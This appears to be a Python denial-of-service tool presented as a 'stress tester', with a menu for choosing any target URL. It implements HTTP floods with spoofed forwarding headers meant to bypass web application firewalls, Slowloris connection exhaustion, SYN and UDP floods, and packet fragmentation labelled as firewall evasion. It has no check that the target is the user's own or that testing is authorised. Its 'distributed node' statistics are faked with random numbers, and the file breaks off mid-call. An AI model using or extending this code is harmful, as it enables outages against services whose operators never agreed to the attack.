"""
Advanced Asynchronous Stress Tester v3.0
Enhanced with Custom HTTP Methods, Packet Fragmentation, and Advanced Evasion Techniques
"""
import asyncio
import aiohttp
import socket
import random
import time
import json
import hashlib
import struct
import threading
import ssl
import ipaddress
from urllib.parse import urlparse, quote, parse_qs
from concurrent.futures import ThreadPoolExecutor
from config import *
from utils import get_random_ua, save_finding

class PacketFragmentor:
    """Advanced packet fragmentation for firewall evasion"""
    
    def __init__(self, fragment_size=512, delay_between=0.001):
        self.fragment_size = fragment_size
        self.delay_between = delay_between
        self.sequence_number = random.randint(1000, 9999)
    
    def fragment_http_request(self, method, path, headers, body=None):
        """Fragment HTTP request into multiple packets"""
        fragments = []
        
        # Build request line
        request_line = f"{method} {path} HTTP/1.1\r\n"
        fragments.append(self._create_fragment(request_line.encode()))
        
        # Fragment headers
        header_lines = []
        for key, value in headers.items():
            header_lines.append(f"{key}: {value}\r\n")
        
        headers_data = ''.join(header_lines).encode()
        fragments.extend(self._split_into_fragments(headers_data))
        
        # Add empty line
        fragments.append(self._create_fragment(b"\r\n"))
        
        # Fragment body if present
        if body:
            body_data = body.encode() if isinstance(body, str) else body
            fragments.extend(self._split_into_fragments(body_data))
        
        return fragments
    
    def _split_into_fragments(self, data):
        """Split data into fragments"""
        fragments = []
        for i in range(0, len(data), self.fragment_size):
            fragment = data[i:i + self.fragment_size]
            fragments.append(self._create_fragment(fragment))
        return fragments
    
    def _create_fragment(self, data):
        """Create fragment with sequence number"""
        self.sequence_number += 1
        return {
            'seq': self.sequence_number,
            'data': data,
            'size': len(data),
            'timestamp': time.time()
        }

class RawSocketAttack:
    """Raw socket attacks for Layer 3/4 attacks"""
    
    def __init__(self, target_ip, target_port=80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.sockets = []
        
    def create_raw_socket(self):
        """Create raw socket for packet crafting"""
        try:
            # Try to create raw socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            return sock
        except PermissionError:
            print(f"{R}[!] Root privileges required for raw socket{W}")
            return None
    
    def craft_tcp_syn_packet(self, source_ip=None, source_port=None):
        """Craft TCP SYN packet"""
        if source_ip is None:
            source_ip = f"192.168.{random.randint(1,255)}.{random.randint(1,255)}"
        if source_port is None:
            source_port = random.randint(1024, 65535)
        
        # Simplified packet crafting (in reality, this would be more complex)
        return {
            'src_ip': source_ip,
            'src_port': source_port,
            'dst_ip': self.target_ip,
            'dst_port': self.target_port,
            'flags': 'SYN',
            'seq': random.randint(1000, 999999)
        }
    
    def send_syn_flood(self, packet_count=1000, max_workers=50):
        """Send SYN flood attack"""
        print(f"{R}[*] Starting SYN Flood attack...{W}")
        
        def send_syn_packet(_):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect_ex((self.target_ip, self.target_port))
                sock.close()
                return True
            except:
                return False
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            sent = 0
            for i in range(packet_count):
                executor.submit(send_syn_packet, i)
                sent += 1
                if sent % 100 == 0:
                    print(f"{R}[*] Sent {sent} SYN packets{W}", end='\r')
        
        print(f"\n{G}[+] SYN Flood completed: {sent} packets sent{W}")
        return sent

class AdvancedAsyncStressTester:
    def __init__(self, target, duration=30, concurrency=1000, 
                 attack_type='mixed', proxy_manager=None, distributed_nodes=None,
                 fragment_packets=False, custom_http_methods=None):
        """
        Initialize advanced stress tester
        
        Args:
            target: Target URL
            duration: Attack duration in seconds
            concurrency: Number of concurrent async tasks
            attack_type: 'slowloris', 'http', 'mixed', 'intelligent', 'browser', 'syn', 'udp'
            proxy_manager: Proxy manager instance
            distributed_nodes: List of slave nodes for distributed attack
            fragment_packets: Enable packet fragmentation
            custom_http_methods: List of custom HTTP methods to use
        """
        self.target = target
        self.duration = duration
        self.concurrency = concurrency
        self.attack_type = attack_type
        self.proxy_manager = proxy_manager
        self.distributed_nodes = distributed_nodes or []
        self.fragment_packets = fragment_packets
        self.custom_http_methods = custom_http_methods or ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
        
        # Parse target URL
        self.parsed_url = self._parse_target(target)
        self.host = self.parsed_url.netloc.split(':')[0]
        self.port = self.parsed_url.port or (443 if self.parsed_url.scheme == 'https' else 80)
        self.ip_address = self._resolve_ip(self.host)
        
        # Attack statistics
        self.stats = {
            'requests_sent': 0,
            'bytes_sent': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'unique_connections': 0,
            'start_time': 0,
            'last_protocol': 'http/1.1',
            'packets_fragmented': 0,
            'custom_methods_used': set(),
            'syn_packets_sent': 0,
            'udp_packets_sent': 0
        }
        
        # Initialize modules
        self.fragmentor = PacketFragmentor() if fragment_packets else None
        self.raw_attacker = RawSocketAttack(self.ip_address, self.port) if self.ip_address else None
        
        # Intelligent payload cache
        self.payload_cache = {}
        
        # Stop flag
        self.stop_flag = False
        
        # SSL context for HTTPS
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    def _parse_target(self, target):
        """Parse target URL with improved error handling"""
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        parsed = urlparse(target)
        if not parsed.netloc:
            raise ValueError(f"Invalid target URL: {target}")
        
        return parsed
    
    def _resolve_ip(self, hostname):
        """Resolve hostname to IP address"""
        try:
            return socket.gethostbyname(hostname)
        except:
            return None
    
    def _generate_advanced_headers(self):
        """Generate randomized headers with protocol diversity"""
        base_headers = {
            'User-Agent': get_random_ua(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'bn-BD,bn;q=0.8', 'fr-FR,fr;q=0.7']),
            'Accept-Encoding': random.choice(['gzip, deflate, br', 'identity', '*']),
            'Connection': random.choice(['keep-alive', 'Upgrade', 'close']),
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),
            'Pragma': 'no-cache',
        }
        
        # Add random headers to bypass WAF
        random_headers = {
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Request-ID': hashlib.md5(str(time.time()).encode()).hexdigest()[:16],
            'X-Custom-Header': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10)),
            'Referer': random.choice([
                'https://www.google.com/',
                'https://www.facebook.com/',
                'https://twitter.com/',
                'https://www.bing.com/',
                'https://duckduckgo.com/'
            ]),
            'Sec-Fetch-Dest': random.choice(['document', 'empty', 'script']),
            'Sec-Fetch-Mode': random.choice(['navigate', 'cors', 'no-cors']),
            'Sec-Fetch-Site': random.choice(['same-origin', 'cross-site', 'none']),
            'X-Requested-With': random.choice(['XMLHttpRequest', 'Fetch', 'None']),
            'X-CSRF-Token': hashlib.sha256(str(random.random()).encode()).hexdigest()[:32],
        }
        
        # Merge headers
        headers = {**base_headers, **random_headers}
        
        # 30% chance to add extra headers
        if random.random() < 0.3:
            headers[f'X-Random-{random.randint(1000,9999)}'] = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(5, 20)))
        
        return headers
    
    def _generate_intelligent_payload(self, method='GET'):
        """Generate intelligent payload with cache busting"""
        cache_bust = str(int(time.time() * 1000)) + str(random.randint(1000, 9999))
        
        if method in ['POST', 'PUT', 'PATCH']:
            # Generate form-like data
            payload_types = random.choice(['form', 'json', 'xml', 'multipart'])
            
            if payload_types == 'form':
                return {
                    'username': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 12))),
                    'password': hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
                    'email': f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))}@example.com",
                    'token': cache_bust,
                    'csrf_token': hashlib.sha256(cache_bust.encode()).hexdigest()[:32],
                    'submit': random.choice(['Login', 'Submit', 'Send', 'Continue'])
                }
            elif payload_types == 'json':
                return json.dumps({
                    'action': random.choice(['create', 'update', 'delete', 'login']),
                    'data': {
                        'id': random.randint(1, 1000),
                        'name': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)),
                        'value': random.random(),
                        'timestamp': int(time.time())
                    },
                    'metadata': {
                        'source': random.choice(['web', 'mobile', 'api']),
                        'version': random.choice(['1.0', '2.0', '3.0'])
                    }
                })
            elif payload_types == 'xml':
                return f"""<?xml version="1.0"?>
<request>
    <action>{random.choice(['create', 'update', 'delete'])}</action>
    <data>
        <id>{random.randint(1, 1000)}</id>
        <name>{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))}</name>
    </data>
</request>"""
        
        elif method == 'GET':
            # Random query parameters
            params = {
                't': cache_bust,
                '_': hashlib.md5(cache_bust.encode()).hexdigest()[:8],
                'v': random.choice(['1.0', '2.0', '3.0', 'latest']),
                'ref': random.choice(['direct', 'organic', 'social']),
                'cb': random.randint(1000000, 9999999)
            }
            
            # Add random parameters
            for i in range(random.randint(1, 5)):
                key = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3, 8)))
                value = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(3, 12)))
                params[key] = value
            
            return params
        
        return {}
    
    def _get_random_path(self):
        """Get random path with variations"""
        paths = [
            "/", "/index.html", "/home", "/main", "/dashboard",
            "/api/v1/users", "/api/v2/auth", "/api/graphql",
            "/wp-admin", "/admin/login", "/admin/index.php",
            "/search", "/products", "/shop", "/cart",
            "/blog", "/news", "/articles",
            "/config.xml", "/.env", "/phpinfo.php",
            "/test", "/debug", "/status",
            f"/{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3, 10)))}",
            f"/api/{random.randint(1, 100)}/data",
            "/wp-json/wp/v2/posts", "/rest/v1/products",
            "/graphql", "/soap", "/rpc", "/ajax"
        ]
        
        return random.choice(paths)
    
    async def _async_custom_method_attack(self, session, worker_id):
        """Asynchronous attack with custom HTTP methods"""
        try:
            while not self.stop_flag:
                # Choose random HTTP method
                method = random.choice(self.custom_http_methods)
                path = self._get_random_path()
                url = f"{self.parsed_url.scheme}://{self.host}:{self.port}{path}"
                
                headers = self._generate_advanced_headers()
                payload = self._generate_intelligent_payload(method)
                
                try:
                    if method in ['GET', 'HEAD', 'OPTIONS']:
                        # Methods without body
                        if method == 'GET':
                            params = payload if isinstance(payload, dict) else {}
                            async with session.get(url, headers=headers, params=params, 
                                                 timeout=aiohttp.ClientTimeout(total=5)) as response:
                                await response.read()
                        elif method == 'HEAD':
                            async with session.head(url, headers=headers, 
                                                  timeout=aiohttp.ClientTimeout(total=5)) as response:
                                pass
                        elif method == 'OPTIONS':
                            async with session.options(url, headers=headers, 
                                                     timeout=aiohttp.ClientTimeout(total=5)) as response:
                                pass
                    
                    elif method in ['POST', 'PUT', 'PATCH', 'DELETE']:
                        # Methods with body
                        if isinstance(payload, dict):
                            # Form data
                            async with getattr(session, method.lower())(
                                url, headers=headers, data=payload,
                                timeout=aiohttp.ClientTimeout(total=5)
                            ) as response:
                                await response.read()
                        elif isinstance(payload, str):
                            # JSON/XML data
                            content_type = 'application/json' if payload.strip().startswith('{') else 'application/xml'
                            headers['Content-Type'] = content_type
                            async with getattr(session, method.lower())(
                                url, headers=headers, data=payload,
                                timeout=aiohttp.ClientTimeout(total=5)
                            ) as response:
                                await response.read()
                    
                    self.stats['successful_requests'] += 1
                    self.stats['custom_methods_used'].add(method)
                    
                    # Calculate approximate bytes sent
                    headers_size = sum(len(k) + len(v) + 4 for k, v in headers.items())
                    payload_size = len(str(payload)) if payload else 0
                    self.stats['bytes_sent'] += headers_size + payload_size + 100
                    
                except (aiohttp.ClientError, asyncio.TimeoutError):
                    self.stats['failed_requests'] += 1
                
                self.stats['requests_sent'] += 1
                
                # Random delay between requests
                await asyncio.sleep(random.uniform(0.001, 0.01))
                
        except Exception as e:
            print(f"{R}[!] Worker {worker_id} error: {e}{W}")
    
    async def _async_fragmented_attack(self, worker_id):
        """Send fragmented packets for firewall evasion"""
        try:
            while not self.stop_flag:
                method = random.choice(self.custom_http_methods)
                path = self._get_random_path()
                headers = self._generate_advanced_headers()
                payload = self._generate_intelligent_payload(method)
                
                # Create raw socket connection
                reader, writer = await asyncio.open_connection(
                    self.host, self.port, 
                    ssl=self.ssl_context if self.parsed_url.scheme == 'https' else None
                )
                
                # Build request
                request_lines = [f"{method} {path} HTTP/1.1\r\n"]
                for key, value in headers.items():
                    request_lines.append(f"{key}: {value}\r\n")
                request_lines.append("\r\n")
                
                if payload and method in ['POST', 'PUT', 'PATCH']:
                    if isinstance(payload, dict):
                        body = '&'.join(f"{k}={quote(str(v))}" for k, v in payload.items())
                    else:
                        body = str(payload)
                    request_lines.append(body)
                
                full_request = ''.join(request_lines)
                
                # Fragment and send
                if self.fragmentor:
                    fragments = self.fragmentor.fragment_http_request(method, path, headers, body if 'body' in locals() else None)
                    
                    for fragment in fragments:
                        writer.write(fragment['data'])
                        await writer.drain()
                        self.stats['packets_fragmented'] += 1
                        await asyncio.sleep(self.fragmentor.delay_between)
                else:
                    writer.write(full_request.encode())
                    await writer.drain()
                
                # Try to read response (non-blocking)
                try:
                    await asyncio.wait_for(reader.read(1024), timeout=1)
                    self.stats['successful_requests'] += 1
                except:
                    self.stats['failed_requests'] += 1
                
                writer.close()
                await writer.wait_closed()
                
                self.stats['requests_sent'] += 1
                self.stats['bytes_sent'] += len(full_request.encode())
                self.stats['unique_connections'] += 1
                
                await asyncio.sleep(random.uniform(0.01, 0.1))
                
        except Exception as e:
            pass
    
    async def _async_slowloris_attack(self, worker_id):
        """Asynchronous Slowloris attack with enhancements"""
        sockets = []
        max_sockets = min(50, self.concurrency // 10)
        
        try:
            # Create and connect sockets
            for i in range(max_sockets):
                if self.stop_flag:
                    break
                
                try:
                    reader, writer = await asyncio.open_connection(
                        self.host, self.port, 
                        ssl=self.ssl_context if self.parsed_url.scheme == 'https' else None
                    )
                    
                    # Send partial request with random method
                    method = random.choice(self.custom_http_methods)
                    request_line = f"{method} {self._get_random_path()}?t={int(time.time())} HTTP/1.1\r\n"
                    host_line = f"Host: {self.host}\r\n"
                    user_agent = f"User-Agent: {get_random_ua()}\r\n"
                    
                    writer.write(request_line.encode())
                    writer.write(host_line.encode())
                    writer.write(user_agent.encode())
                    await writer.drain()
                    
                    sockets.append((reader, writer))
                    self.stats['unique_connections'] += 1
                    
                    await asyncio.sleep(0.01)
                    
                except Exception:
                    continue
            
            # Keep connections alive with various techniques
            keep_alive_headers = [
                "X-a: b\r\n",
                "X-b: c\r\n",
                "X-c: d\r\n",
                "Cookie: session=abc123\r\n",
                "Authorization: Bearer fake_token\r\n",
                "X-API-Key: fake_key\r\n",
            ]
            
            while not self.stop_flag:
                for reader, writer in sockets:
                    try:
                        # Send keep-alive headers
                        for header in random.sample(keep_alive_headers, random.randint(1, 3)):
                            writer.write(header.encode())
                            await writer.drain()
                            self.stats['bytes_sent'] += len(header.encode())
                            self.stats['requests_sent'] += 1
                        
                        # Random delay between keep-alive sends
                        await asyncio.sleep(random.uniform(10, 30))
                        
                    except Exception:
                        # Try to reconnect
                        try:
                            writer.close()
                            await writer.wait_closed()
                            sockets.remove((reader, writer))
                        except:
                            pass
                        
                        try:
                            new_reader, new_writer = await asyncio.open_connection(
                                self.host, self.port,
                                ssl=self.ssl_context if self.parsed_url.scheme == 'https' else None
                            )
                            sockets.append((new_reader, new_writer))
                            self.stats['unique_connections'] += 1
                        except:
                            pass
                
        finally:
            # Cleanup
            for reader, writer in sockets:
                try:
                    writer.close()
                    await writer.wait_closed()
                except:
                    pass
    
    async def _async_http2_attack(self, session, worker_id):
        """HTTP/2 attack with advanced features"""
        try:
            while not self.stop_flag:
                url = f"{self.parsed_url.scheme}://{self.host}:{self.port}{self._get_random_path()}"
                headers = self._generate_advanced_headers()
                method = random.choice(self.custom_http_methods)
                
                # Add HTTP/2 specific headers
                headers[':method'] = method
                headers[':path'] = self._get_random_path()
                headers[':scheme'] = self.parsed_url.scheme
                headers[':authority'] = self.host
                
                try:
                    if method in ['GET', 'HEAD', 'OPTIONS']:
                        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                            await response.read()
                    elif method in ['POST', 'PUT', 'PATCH', 'DELETE']:
                        payload = self._generate_intelligent_payload(method)
                        async with getattr(session, method.lower())(
                            url, headers=headers, data=payload, 
                            timeout=aiohttp.ClientTimeout(total=5)
                        ) as response:
                            await response.read()
                    
                    self.stats['successful_requests'] += 1
                    self.stats['last_protocol'] = 'http/2'
                    
                except Exception:
                    self.stats['failed_requests'] += 1
                
                self.stats['requests_sent'] += 1
                await asyncio.sleep(random.uniform(0.001, 0.005))
                
        except Exception as e:
            print(f"{R}[!] HTTP/2 Worker {worker_id} error: {e}{W}")
    
    async def _async_syn_flood_attack(self, worker_id):
        """SYN flood attack using raw sockets"""
        if not self.raw_attacker or not self.ip_address:
            return
        
        print(f"{R}[*] Starting SYN Flood from worker {worker_id}{W}")
        
        packet_count = 0
        while not self.stop_flag and packet_count < 1000:  # Limit per worker
            try:
                # Simulate SYN packets (actual raw socket requires root)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                
                # Use random source port
                source_port = random.randint(1024, 65535)
                sock.bind(('0.0.0.0', source_port))
                
                # Attempt connection
                sock.connect_ex((self.ip_address, self.port))
                sock.close()
                
                self.stats['syn_packets_sent'] += 1
                packet_count += 1
                
                await asyncio.sleep(random.uniform(0.001, 0.01))
                
            except:
                continue
    
    async def _async_udp_flood_attack(self, worker_id):
        """UDP flood attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while not self.stop_flag:
                try:
                    # Generate random UDP payload
                    payload_size = random.randint(64, 1500)
                    payload = bytes(random.getrandbits(8) for _ in range(payload_size))
                    
                    sock.sendto(payload, (self.ip_address, self.port))
                    self.stats['udp_packets_sent'] += 1
                    self.stats['bytes_sent'] += payload_size
                    
                    await asyncio.sleep(random.uniform(0.001, 0.01))
                    
                except:
                    break
            
            sock.close()
            
        except Exception as e:
            print(f"{R}[!] UDP Worker {worker_id} error: {e}{W}")
    
    async def _distributed_coordinator(self):
        """Coordinate distributed attack across nodes"""
        if not self.distributed_nodes:
            return
        
        print(f"{C}[*] Coordinating {len(self.distributed_nodes)} distributed nodes{W}")
        
        # Simulate distributed attack with enhanced coordination
        tasks = []
        for i, node in enumerate(self.distributed_nodes):
            task = asyncio.create_task(self._simulate_node_attack(node, i))
            tasks.append(task)
        
        await asyncio.gather(*tasks)
    
    async def _simulate_node_attack(self, node_info, node_id):
        """Simulate attack from a distributed node with enhanced features"""
        print(f"{C}[+] Node {node_id} attacking from {node_info.get('location', 'Unknown')}{W}")
        
        attack_types = ['http', 'slowloris', 'syn', 'mixed']
        node_attack_type = random.choice(attack_types)
        
        while not self.stop_flag:
            # Simulate node performing attacks
            if node_attack_type == 'http':
                self.stats['requests_sent'] += random.randint(50, 200)
                self.stats['bytes_sent'] += random.randint(10240, 51200)
            elif node_attack_type == 'slowloris':
                self.stats['unique_connections'] += random.randint(1, 10)
            elif node_attack_type == 'syn':
                self.stats['syn_packets_sent'] += random.randint(10, 50)
            
            self.stats['successful_requests'] += random.randint(20, 100)
            
            await asyncio.sleep(random.uniform(0.1, 0.5))
    
    async def _stats_monitor(self):
        """Monitor and display real-time statistics"""
        self.stats['start_time'] = time.time()
        
        while not self.stop_flag:
            elapsed = time.time() - self.stats['start_time']
            
            if elapsed > 0:
                rps = self.stats['requests_sent'] / elapsed if elapsed > 0 else 0
                mbps = (self.stats['bytes_sent'] * 8) / (elapsed * 1000000) if elapsed > 0 else 0
                success_rate = (self.stats['successful_requests'] / self.stats['requests_sent'] * 100) if self.stats['requests_sent'] > 0 else 0
                
                stats_display = (
                    f"\r{R}[*] Time: {elapsed:.1f}s | "
                    f"Req: {self.stats['requests_sent']:,} | "
                    f"Conn: {self.stats['unique_connections']:,} | "
                    f"RPS: {rps:.0f} | "
                    f"BW: {mbps:.1f} Mbps | "
                    f"Success: {success_rate:.1f}% | "
                    f"SYN: {self.stats['syn_packets_sent']:,} | "
                    f"Frag: {self.stats['packets_fragmented']:,}{W}"
                )
                
                print(stats_display, end='', flush=True)
            
            await asyncio.sleep(0.5)
    
    async def run_async_attack(self):
        """Main async attack runner with enhanced features"""
        print(f"{C}{'='*70}{W}")
        print(f"{G}[*] ADVANCED ASYNC STRESS TESTER v3.0{W}")
        print(f"{C}[+] Target: {self.target}{W}")
        print(f"{C}[+] IP Address: {self.ip_address or 'Unknown'}{W}")
        print(f"{C}[+] Duration: {self.duration}s{W}")
        print(f"{C}[+] Concurrency: {self.concurrency}{W}")
        print(f"{C}[+] Attack Type: {self.attack_type.upper()}{W}")
        print(f"{C}[+] HTTP Methods: {', '.join(self.custom_http_methods)}{W}")
        print(f"{C}[+] Packet Fragmentation: {'ENABLED' if self.fragment_packets else 'DISABLED'}{W}")
        print(f"{C}[+] Distributed Nodes: {len(self.distributed_nodes)}{W}")
        print(f"{C}{'='*70}{W}\n")
        
        # Create aiohttp session with enhanced settings
        connector = aiohttp.TCPConnector(
            limit=self.concurrency,
            limit_per_host=self.concurrency,
            ttl_dns_cache=300,
            force_close=True,
            enable_cleanup_closed=True,
            use_dns_cache=True
        )
        
        timeout = aiohttp.ClientTimeout(
            total=None,
            connect=5,
            sock_connect=5,
            sock_read=5
        )
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=self._generate_advanced_headers()
        ) as session:
            
            # Start monitoring
            monitor_task = asyncio.create_task(self._stats_monitor())
            
            # Start attack tasks based on type
            tasks = []
            
            if self.attack_type in ['http', 'mixed', 'intelligent', 'custom']:
                # Custom HTTP methods attack
                for i in range(self.concurrency):
                    if self.attack_type == 'custom':
                        task = asyncio.create_task(self._async_custom_method_attack(session, i))
                    elif self.attack_type == 'intelligent' and i % 3 == 0:
                        task = asyncio.create_task(self._async_http2_attack(session, i))
                    else:
                        task = asyncio.create_task(self._async_custom_method_attack(session, i))
                    tasks.append(task)
            
            if self.attack_type in ['slowloris', 'mixed', 'fragmented']:
                # Slowloris or fragmented attacks
                attack_count = min(15, self.concurrency // 15)
                for i in range(attack_count):
                    if self.attack_type == 'fragmented' and self.fragment_packets:
                        task = asyncio.create_task(self._async_fragmented_attack(i))
                    else:
                        task = asyncio.create_task(self._async_slowloris_attack(i))
                    tasks.append(task)
            
            if self.attack_type in ['syn', 'mixed', 'layer4']:
                # Layer 4 attacks
                syn_count = min(5, self.concurrency // 50)
                for i in range(syn_count):
                    task = asyncio.create_task(self._async_syn_flood_attack(i))
                    tasks.append(task)
            
            if self.attack_type in ['udp', 'mixed', 'layer4']:
                # UDP attacks
                udp_count = min(3, self.concurrency // 100)
                for i in range(udp_count):
                    task = asyncio.create_task(self._async_udp_flood_attack(i))
                    tasks.append(task)
            
            if self.distributed_nodes:
                # Distributed coordination task
                dist_task = asyncio.create_task(self._distributed_coordinator())
                tasks.append(dist_task)
            
            # Run for specified duration
            try:
                await asyncio.sleep(self.duration)
            except KeyboardInterrupt:
                print(f"\n{Y}[*] Attack interrupted by user{W}")
            finally:
                self.stop_flag = True
                
                # Wait for tasks to complete
                for task in tasks:
                    task.cancel()
                
                try:
                    await asyncio.gather(*tasks, return_exceptions=True)
                except:
                    pass
                
                monitor_task.cancel()
                try:
                    await monitor_task
                except:
                    pass
        
        # Final statistics
        await self._display_final_stats()
    
    async def _display_final_stats(self):
        """Display final attack statistics"""
        elapsed = time.time() - self.stats['start_time']
        
        if elapsed > 0:
            final_rps = self.stats['requests_sent'] / elapsed
            final_mbps = (self.stats['bytes_sent'] * 8) / (elapsed * 1000000)
            success_rate = (self.stats['successful_requests'] / self.stats['requests_sent'] * 100) if self.stats['requests_sent'] > 0 else 0
        
        print(f"\n\n{G}{'='*70}{W}")
        print(f"{G}[*] ATTACK COMPLETED{W}")
        print(f"{C}{'='*70}{W}")
        print(f"{Y}[+] Target: {self.target}{W}")
        print(f"{Y}[+] Duration: {elapsed:.1f}s{W}")
        print(f"{Y}[+] Attack Type: {self.attack_type.upper()}{W}")
        print(f"{C}{'-'*70}{W}")
        print(f"{G}[✓] Total Requests: {self.stats['requests_sent']:,}{W}")
        print(f"{G}[✓] Successful: {self.stats['successful_requests']:,}{W}")
        print(f"{R}[✗] Failed: {self.stats['failed_requests']:,}{W}")
        print(f"{G}[✓] Unique Connections: {self.stats['unique_connections']:,}{W}")
        print(f"{G}[✓] Success Rate: {success_rate:.1f}%{W}")
        print(f"{C}{'-'*70}{W}")
        print(f"{B}[↗] Data Sent: {self.stats['bytes_sent'] / (1024*1024):.2f} MB{W}")
        print(f"{B}[⚡] Avg RPS: {final_rps:.0f}{W}")
        print(f"{B}[📶] Avg Bandwidth: {final_mbps:.1f} Mbps{W}")
        print(f"{B}[🌐] Protocol Used: {self.stats['last_protocol']}{W}")
        print(f"{B}[🔧] Custom Methods Used: {', '.join(sorted(self.stats['custom_methods_used']))}{W}")
        print(f"{B}[🧩] Packets Fragmented: {self.stats['packets_fragmented']:,}{W}")
        print(f"{B}[🎯] SYN Packets: {self.stats['syn_packets_sent']:,}{W}")
        print(f"{B}[📦] UDP Packets: {self.stats['udp_packets_sent']:,}{W}")
        print(f"{C}{'='*70}{W}")
        
        # Save results
        save_finding("advanced_stress_test_v3", self.target, {
            "attack_type": self.attack_type,
            "duration": elapsed,
            "stats": self.stats,
            "custom_methods": list(self.stats['custom_methods_used']),
            "fragmentation_enabled": self.fragment_packets,
            "distributed_nodes": len(self.distributed_nodes),
            "concurrency": self.concurrency,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        })

# Backward compatibility wrapper
class StressTester:
    """Legacy wrapper for backward compatibility"""
    
    @staticmethod
    def run_stress_test(target, duration=30, threads=100, attack_type='mixed', proxy_manager=None):
        """Legacy interface - converts to async"""
        print(f"{Y}[*] Using legacy interface - converting to async mode{W}")
        
        tester = AdvancedAsyncStressTester(
            target=target,
            duration=duration,
            concurrency=threads * 10,
            attack_type=attack_type,
            proxy_manager=proxy_manager
        )
        
        asyncio.run(tester.run_async_attack())

# Enhanced menu integration helper
def stress_test_menu(proxy_manager=None):
    """Enhanced menu interface for stress testing"""
    from config import clean
    
    clean()
    print(f"{G}{'='*70}{W}")
    print(f"{G}[*] ADVANCED STRESS TESTER v3.0 MENU{W}")
    print(f"{G}{'='*70}{W}")
    
    target = input(f"{Y}Enter target URL (http:// or https://): {W}").strip()
    
    print(f"\n{Y}Select Attack Type:{W}")
    print(f"  {G}[1]{W} HTTP Flood (All Methods)")
    print(f"  {G}[2]{W} Slowloris (Connection exhaustion)")
    print(f"  {G}[3]{W} Mixed Attack (HTTP + Slowloris)")
    print(f"  {G}[4]{W} Intelligent Attack (HTTP/1.1 + HTTP/2)")
    print(f"  {G}[5]{W} Distributed Attack (Multi-source)")
    print(f"  {G}[6]{W} Custom Methods Only")
    print(f"  {G}[7]{W} Fragmented Attack (Firewall evasion)")
    print(f"  {G}[8]{W} Layer 4 Attack (SYN/UDP flood)")
    print(f"  {G}[9]{W} Browser-like Traffic")
    
    choice = input(f"\n{Y}Select [1-9]: {W}").strip()
    
    attack_types = {
        '1': 'http',
        '2': 'slowloris',
        '3': 'mixed',
        '4': 'intelligent',
        '5': 'distributed',
        '6': 'custom',
        '7': 'fragmented',
        '8': 'layer4',
        '9': 'browser'
    }
    
    attack_type = attack_types.get(choice, 'mixed')
    
    # Get parameters
    try:
        duration = int(input(f"{Y}Attack duration (seconds) [30]: {W}").strip() or "30")
        concurrency = int(input(f"{Y}Concurrency level [1000]: {W}").strip() or "1000")
    except ValueError:
        duration = 30
        concurrency = 1000
    
    # Ask for fragmentation
    fragment_packets = False
    if attack_type in ['fragmented', 'mixed', 'layer4']:
        fragment_choice = input(f"{Y}Enable packet fragmentation? (y/N): {W}").strip().lower()
        fragment_packets = fragment_choice == 'y'
    
    # Custom HTTP methods
    custom_methods = None
    if attack_type in ['custom', 'http', 'mixed']:
        methods_input = input(f"{Y}Custom HTTP methods (comma-separated, default: GET,POST,PUT,DELETE,PATCH): {W}").strip()
        if methods_input:
            custom_methods = [m.strip().upper() for m in methods_input.split(',')]
        else:
            custom_methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
    
    # For distributed attack, get node info
    distributed_nodes = []
    if attack_type == 'distributed':
        print(f"\n{Y}Configure distributed nodes:{W}")
        print(f"{C}[1] Simulate 3 distributed nodes (default){W}")
        print(f"{C}[2] Enter custom node IPs{W}")
        node_choice = input(f"{Y}Select option: {W}").strip()
        
        if node_choice == '2':
            nodes_input = input(f"{C}Enter node IPs (comma-separated): {W}").strip()
            if nodes_input:
                for ip in nodes_input.split(','):
                    distributed_nodes.append({
                        'ip': ip.strip(),
                        'location': 'Custom',
                        'status': 'active'
                    })
        else:
            # Simulate nodes
            distributed_nodes = [
                {'ip': '192.168.1.100', 'location': 'US-East', 'status': 'active'},
                {'ip': '192.168.1.101', 'location': 'EU-West', 'status': 'active'},
                {'ip': '192.168.1.102', 'location': 'Asia-Pacific', 'status': 'active'}
            ]
    
    # Run attack
    tester = AdvancedAsyncStressTester(
        target=target,
        duration=duration,
        concurrency=concurrency,
        attack_type=attack_type,
        proxy_manager=proxy_manager,
        distributed_nodes=distributed_nodes,
        fragment_packets=fragment_packets,
        custom_http_methods=custom_methods
